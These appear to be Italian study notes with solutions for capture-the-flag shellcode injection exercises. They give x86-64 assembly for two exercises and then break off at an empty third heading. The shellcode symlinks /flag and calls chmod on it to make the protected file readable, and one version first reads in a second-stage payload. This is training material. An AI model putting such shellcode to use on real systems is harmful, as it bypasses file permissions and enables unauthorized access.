# Soluzioni da memorizzare

> [!Note]
>
> In generale per tutti gli esercizi di **assembly** e **injection** potrebbe essere necessario introdurre queste righe di codice
>
> ```python
> from pwn import *
> import subprocess
> 
> subprocess.run(["mkdir", "-p", "/tmp/pwntools-cache"])
> 
> context.arch = "x86-64"
> context.cache_dir = "/tmp/pwntools-cache"
> ```
>
> Questo potrebbe essere necessario per una questione di permessi in con cache di **pwntools**.

## Inject

Prima di tutto bisogna softlinkare la flag in ogni esercizio `ln -s /flag f`.

### es14

```assembly
    push rdx
    pop rsi
    push rax
    pop rdi 
    syscall
.rept
    nop 
.endr
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90 
    pop rax
    syscall
```

### es13

```assembly
 	push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90 
    pop rax
    syscall
```

### es12

